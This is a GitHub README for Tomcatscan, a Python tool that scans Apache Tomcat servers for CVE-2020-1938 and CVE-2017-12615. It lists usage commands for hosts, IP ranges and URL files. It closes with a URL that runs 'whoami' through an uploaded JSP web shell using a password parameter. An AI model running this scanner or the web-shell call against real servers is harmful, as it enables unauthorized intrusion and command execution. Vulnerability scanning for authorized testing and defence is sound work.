# Tomcatscan
Tomcat common vulnerability detection

python3 Tomcatscan.py -u xxx -p xx  //对指定端口进行漏洞探测，同时会检测8009端口cve-2020-1938漏洞
![Image text](https://github.com/einzbernnn/Tomcatscan/blob/main/img/1.png)

python TomcatScan.py -H 192.168.1.1-192.168.2.255 //默认检测8080，8081，80，443，8009端口，如需深入探测，可以先利用信息收集工具收集tomcat url保存到文件中后通过 -f参数检测


python TomcatScan.py -f url.txt
#-f 参数 文件中ip的几种格式：

http://192.168.1.1:8080 ##检测8080端口，同时检测8009端口是否存在cve_2020_1938

http://192.168.1.1          ##检测80端口和443端口，同时检测8009端口是否存在cve_2020_1938

https://192.168.1.1         ##检测80端口和443端口，同时检测8009端口是否存在cve_2020_1938

192.168.1.1                   ##检测80端口和443端口，同时检测8009端口是否存在cve_2020_1938

192.168.1.1:8080         ##检测8080端口和443端口，同时检测8009端口是否存在cve_2020_1938



cve-2017-12615 shell利用：访问并执行命令
![Image text](https://github.com/einzbernnn/Tomcatscan/blob/main/img/2.png)
http://192.168.3.137:8080/1635405387.jsp?&pwd=023&cmd=whoami
